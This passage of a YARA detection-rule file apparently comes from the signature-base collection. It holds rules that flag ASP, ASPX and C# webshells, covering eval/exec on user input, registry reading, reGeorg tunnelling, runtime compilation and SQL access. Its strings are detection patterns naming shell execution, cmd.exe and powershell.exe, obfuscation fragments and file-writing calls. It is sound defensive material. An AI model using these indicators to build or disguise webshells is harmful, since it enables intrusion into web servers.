		$asp_multi_payload_three3 = ".Start" wide ascii
		$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
		$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
		$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
		$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
		$asp_multi_payload_five2 = ".Start" nocase wide ascii
		$asp_multi_payload_five3 = ".Filename" nocase wide ascii
		$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and not 1 of ($fp*) and not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and ( filesize <700 and (( any of ($asp_payload*) or all of ($asp_multi_payload_one*) or all of ($asp_multi_payload_two*) or all of ($asp_multi_payload_three*) or all of ($asp_multi_payload_four*) or all of ($asp_multi_payload_five*)) or ( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*)))))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Generic : FILE {
    meta:
		description = "Generic ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
		date = "2021-03-07"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4404-L4702"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
		hash = "4cf6fbad0411b7d33e38075f5e00d4c8ae9ce2f6f53967729974d004a183b25c"
		hash = "a91320483df0178eb3cafea830c1bd94585fc896"
		hash = "f3398832f697e3db91c3da71a8e775ebf66c7e73"
		logic_hash = "60764b137f7e62755ab7e0a266661d19e04434bc1c9eb17864bfcab25476afbf"
		score = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$asp_much_sus7 = "Web Shell" nocase
		$asp_much_sus8 = "WebShell" nocase
		$asp_much_sus3 = "hidded shell"
		$asp_much_sus4 = "WScript.Shell.1" nocase
		$asp_much_sus5 = "AspExec"
		$asp_much_sus14 = "\\pcAnywhere\\" nocase
		$asp_much_sus15 = "antivirus" nocase
		$asp_much_sus16 = "McAfee" nocase
		$asp_much_sus17 = "nishang"
		$asp_much_sus18 = "\"unsafe" fullword wide ascii
		$asp_much_sus19 = "'unsafe" fullword wide ascii
		$asp_much_sus28 = "exploit" fullword wide ascii
		$asp_much_sus30 = "TVqQAAMAAA" wide ascii
		$asp_much_sus31 = "HACKED" fullword wide ascii
		$asp_much_sus32 = "hacked" fullword wide ascii
		$asp_much_sus33 = "hacker" wide ascii
		$asp_much_sus34 = "grayhat" nocase wide ascii
		$asp_much_sus35 = "Microsoft FrontPage" wide ascii
		$asp_much_sus36 = "Rootkit" wide ascii
		$asp_much_sus37 = "rootkit" wide ascii
		$asp_much_sus38 = "/*-/*-*/" wide ascii
		$asp_much_sus39 = "u\"+\"n\"+\"s" wide ascii
		$asp_much_sus40 = "\"e\"+\"v" wide ascii
		$asp_much_sus41 = "a\"+\"l\"" wide ascii
		$asp_much_sus42 = "\"+\"(\"+\"" wide ascii
		$asp_much_sus43 = "q\"+\"u\"" wide ascii
		$asp_much_sus44 = "\"u\"+\"e" wide ascii
		$asp_much_sus45 = "/*//*/" wide ascii
		$asp_much_sus46 = "(\"/*/\"" wide ascii
		$asp_much_sus47 = "eval(eval(" wide ascii
		$asp_much_sus48 = "Shell.Users" wide ascii
		$asp_much_sus49 = "PasswordType=Regular" wide ascii
		$asp_much_sus50 = "-Expire=0" wide ascii
		$asp_much_sus51 = "sh\"&\"el" wide ascii
		$asp_gen_sus1 = /:\s{0,20}eval}/ nocase wide ascii
		$asp_gen_sus2 = /\.replace\(\/\w\/g/ nocase wide ascii
		$asp_gen_sus6 = "self.delete"
		$asp_gen_sus9 = "\"cmd /c" nocase
		$asp_gen_sus10 = "\"cmd\"" nocase
		$asp_gen_sus11 = "\"cmd.exe" nocase
		$asp_gen_sus12 = "%comspec%" wide ascii
		$asp_gen_sus13 = "%COMSPEC%" wide ascii
		$asp_gen_sus18 = "Hklm.GetValueNames();" nocase
		$asp_gen_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
		$asp_gen_sus21 = "\"upload\"" wide ascii
		$asp_gen_sus22 = "\"Upload\"" wide ascii
		$asp_gen_sus25 = "shell_" wide ascii
		$asp_gen_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
		$asp_gen_sus30 = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
		$asp_gen_sus31 = "serv-u" wide ascii
		$asp_gen_sus32 = "Serv-u" wide ascii
		$asp_gen_sus33 = "Army" fullword wide ascii
		$asp_slightly_sus1 = "<pre>" wide ascii
		$asp_slightly_sus2 = "<PRE>" wide ascii
		$asp_gen_obf1 = "\"+\"" wide ascii
		$fp1 = "DataBinder.Eval"
		$fp2 = "B2BTools"
		$fp3 = "<b>Failed to execute cache update. See the log file for more information" ascii
		$fp4 = "Microsoft. All rights reserved."
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii
		$asp_payload0 = "eval_r" fullword nocase wide ascii
		$asp_payload1 = /\beval\s/ nocase wide ascii
		$asp_payload2 = /\beval\(/ nocase wide ascii
		$asp_payload3 = /\beval\"\"/ nocase wide ascii
		$asp_payload4 = /:\s{0,10}eval\b/ nocase wide ascii
		$asp_payload8 = /\bexecute\s?\(/ nocase wide ascii
		$asp_payload9 = /\bexecute\s[\w"]/ nocase wide ascii
		$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
		$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
		$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
		$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
		$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
		$asp_multi_payload_one2 = "addcode" fullword wide ascii
		$asp_multi_payload_one3 = /\.run\b/ wide ascii
		$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
		$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
		$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
		$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
		$asp_multi_payload_three2 = "Process" fullword wide ascii
		$asp_multi_payload_three3 = "Start" fullword wide ascii
		$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
		$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
		$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
		$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
		$asp_multi_payload_five2 = ".Start" nocase wide ascii
		$asp_multi_payload_five3 = ".Filename" nocase wide ascii
		$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii
		$tagasp_capa_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_capa_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_capa_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_capa_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_capa_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and ( any of ($asp_payload*) or all of ($asp_multi_payload_one*) or all of ($asp_multi_payload_two*) or all of ($asp_multi_payload_three*) or all of ($asp_multi_payload_four*) or all of ($asp_multi_payload_five*)) and not any of ($fp*) and (( filesize <3KB and (1 of ($asp_slightly_sus*))) or ( filesize <25KB and (1 of ($asp_much_sus*) or 1 of ($asp_gen_sus*) or (#asp_gen_obf1>2))) or ( filesize <50KB and (1 of ($asp_much_sus*) or 3 of ($asp_gen_sus*) or (#asp_gen_obf1>6))) or ( filesize <150KB and (1 of ($asp_much_sus*) or 4 of ($asp_gen_sus*) or (#asp_gen_obf1>6) or (( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*))) and (1 of ($asp_much_sus*) or 2 of ($asp_gen_sus*) or (#asp_gen_obf1>3))))) or ( filesize <100KB and ( any of ($tagasp_capa_classid*))))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Generic_Registry_Reader : FILE {
    meta:
		description = "Generic ASP webshell which reads the registry (might look for passwords, license keys, database settings, general recon, ..."
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "02d6f95f-1801-5fb0-8ab8-92176cf2fdd7"
		date = "2021-03-14"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4704-L4851"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4d53416398a89aef3a39f63338a7c1bf2d3fcda4"
		hash = "f85cf490d7eb4484b415bea08b7e24742704bdda"
		hash = "898ebfa1757dcbbecb2afcdab1560d72ae6940de"
		logic_hash = "515bff52bebaad45481202ff934f8d1cbb79c27ccf47ca811077acacb7a47f13"
		score = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$asp_reg2 = "LocalMachine" fullword wide ascii
		$asp_reg3 = "ClassesRoot" fullword wide ascii
		$asp_reg4 = "CurrentUser" fullword wide ascii
		$asp_reg5 = "Users" fullword wide ascii
		$asp_reg6 = "CurrentConfig" fullword wide ascii
		$asp_reg7 = "Microsoft.Win32" fullword wide ascii
		$asp_reg8 = "OpenSubKey" fullword wide ascii
		$sus1 = "shell" fullword nocase wide ascii
		$sus2 = "cmd.exe" fullword wide ascii
		$sus3 = "<form " wide ascii
		$sus4 = "<table " wide ascii
		$sus5 = "System.Security.SecurityException" wide ascii
		$fp1 = "Avira Operations GmbH" wide
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and all of ($asp_reg*) and any of ($sus*) and not any of ($fp*) and ( filesize <10KB or ( filesize <150KB and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp))))
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Regeorg_CSHARP : FILE {
    meta:
		description = "Webshell regeorg aspx c# version"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "0a53d368-5f1b-55b7-b08f-36b0f8c5612f"
		date = "2021-01-11"
		modified = "2023-07-05"
		reference = "https://github.com/sensepost/reGeorg"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4853-L4963"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c1f43b7cf46ba12cfc1357b17e4f5af408740af7ae70572c9cf988ac50260ce1"
		hash = "479c1e1f1c263abe339de8be99806c733da4e8c1"
		hash = "38a1f1fc4e30c0b4ad6e7f0e1df5a92a7d05020b"
		hash = "e54f1a3eab740201feda235835fc0aa2e0c44ba9"
		hash = "aea0999c6e5952ec04bf9ee717469250cddf8a6f"
		logic_hash = "0c68f5955df2e75c3b5b4f1c6398fd57add1f64bfb3d46ccebf1c6767f5d2eb1"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$input_sa1 = "Request.QueryString.Get" fullword nocase wide ascii
		$input_sa2 = "Request.Headers.Get" fullword nocase wide ascii
		$sa1 = "AddressFamily.InterNetwork" fullword nocase wide ascii
		$sa2 = "Response.AddHeader" fullword nocase wide ascii
		$sa3 = "Request.InputStream.Read" nocase wide ascii
		$sa4 = "Response.BinaryWrite" nocase wide ascii
		$sa5 = "Socket" nocase wide ascii
		$georg = "Response.Write(\"Georg says, 'All seems fine'\")"
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		filesize <300KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ($georg or ( all of ($sa*) and any of ($input_sa*)))
}
rule SIGNATURE_BASE_WEBSHELL_CSHARP_Generic : FILE {
    meta:
		description = "Webshell in c#"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "6d38a6b0-b1d2-51b0-9239-319f1fea7cae"
		date = "2021-01-11"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L4965-L5073"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b6721683aadc4b4eba4f081f2bc6bc57adfc0e378f6d80e2bfa0b1e3e57c85c7"
		hash = "4b365fc9ddc8b247a12f4648cd5c91ee65e33fae"
		hash = "019eb61a6b5046502808fb5ab2925be65c0539b4"
		hash = "620ee444517df8e28f95e4046cd7509ac86cd514"
		hash = "a91320483df0178eb3cafea830c1bd94585fc896"
		logic_hash = "fb367b79c8ed4a61618594db903cf3d70524685d7710d243163958ecb47634aa"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$input_http = "Request." nocase wide ascii
		$input_form1 = "<asp:" nocase wide ascii
		$input_form2 = ".text" nocase wide ascii
		$exec_proc1 = "new Process" nocase wide ascii
		$exec_proc2 = "start(" nocase wide ascii
		$exec_shell1 = "cmd.exe" nocase wide ascii
		$exec_shell2 = "powershell.exe" nocase wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and filesize <300KB and ($input_http or all of ($input_form*)) and all of ($exec_proc*) and any of ($exec_shell*)
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Runtime_Compile : FILE {
    meta:
		description = "ASP webshell compiling payload in memory at runtime, e.g. sharpyshell"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5da9318d-f542-5603-a111-5b240f566d47"
		date = "2021-01-11"
		modified = "2023-04-05"
		reference = "https://github.com/antonioCoco/SharPyShell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5075-L5173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e826c4139282818d38dcccd35c7ae6857b1d1d01"
		hash = "e20e078d9fcbb209e3733a06ad21847c5c5f0e52"
		hash = "57f758137aa3a125e4af809789f3681d1b08ee5b"
		hash = "bd75ac9a1d1f6bcb9a2c82b13ea28c0238360b3a7be909b2ed19d3c96e519d3d"
		hash = "e44058dd1f08405e59d411d37d2ebc3253e2140385fa2023f9457474031b48ee"
		hash = "f6092ab5c8d491ae43c9e1838c5fd79480055033b081945d16ff0f1aaf25e6c7"
		hash = "dfd30139e66cba45b2ad679c357a1e2f565e6b3140a17e36e29a1e5839e87c5e"
		hash = "89eac7423dbf86eb0b443d8dd14252b4208e7462ac2971c99f257876388fccf2"
		hash = "8ce4eaf111c66c2e6c08a271d849204832713f8b66aceb5dadc293b818ccca9e"
		logic_hash = "6699a44e396eedebb3bafa0e89c3b6d080586a158ed056ec7220bdf2ad764444"
		score = 75
		quality = 19
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload_reflection1 = "System" fullword nocase wide ascii
		$payload_reflection2 = "Reflection" fullword nocase wide ascii
		$payload_reflection3 = "Assembly" fullword nocase wide ascii
		$payload_load_reflection1 = /[."']Load\b/ nocase wide ascii
		$payload_load_reflection2 = /\bGetMethod\(("load|\w)/ nocase wide ascii
		$payload_compile1 = "GenerateInMemory" nocase wide ascii
		$payload_compile2 = "CompileAssemblyFromSource" nocase wide ascii
		$payload_invoke1 = "Invoke" fullword nocase wide ascii
		$payload_invoke2 = "CreateInstance" fullword nocase wide ascii
		$payload_xamlreader1 = "XamlReader" fullword nocase wide ascii
		$payload_xamlreader2 = "Parse" fullword nocase wide ascii
		$payload_xamlreader3 = "assembly=" nocase wide ascii
		$payload_powershell1 = "PSObject" fullword nocase wide ascii
		$payload_powershell2 = "Invoke" fullword nocase wide ascii
		$payload_powershell3 = "CreateRunspace" fullword nocase wide ascii
		$rc_fp1 = "Request.MapPath"
		$rc_fp2 = "<body><mono:MonoSamplesHeader runat=\"server\"/>" wide ascii
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_input4 = "\\u0065\\u0071\\u0075" wide ascii
		$asp_input5 = "\\u0065\\u0073\\u0074" wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii
		$sus_refl1 = " ^= " wide ascii
		$sus_refl2 = "SharPy" wide ascii

	condition:
		(( filesize <50KB and any of ($sus_refl*)) or filesize <10KB) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and not any of ($rc_fp*) and (( all of ($payload_reflection*) and any of ($payload_load_reflection*)) or ( all of ($payload_compile*) and any of ($payload_invoke*)) or all of ($payload_xamlreader*) or all of ($payload_powershell*))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_SQL : FILE {
    meta:
		description = "ASP webshell giving SQL access. Might also be a dual use tool."
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "e534dcb9-40ab-544f-ae55-89fb21c422e9"
		date = "2021-03-14"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5175-L5356"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "216c1dd950e0718e35bc4834c5abdc2229de3612"
		hash = "ffe44e9985d381261a6e80f55770833e4b78424bn"
		hash = "3d7cd32d53abc7f39faed133e0a8f95a09932b64"
		hash = "f19cc178f1cfad8601f5eea2352cdbd2d6f94e7e"
		hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"
		logic_hash = "c59250065c4be267746f716f922007b638706a76579af6509c8e97d0cee03f33"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sql1 = "SqlConnection" fullword wide ascii
		$sql2 = "SQLConnection" fullword wide ascii
		$sql3 = "System" fullword wide ascii
		$sql4 = "Data" fullword wide ascii
		$sql5 = "SqlClient" fullword wide ascii
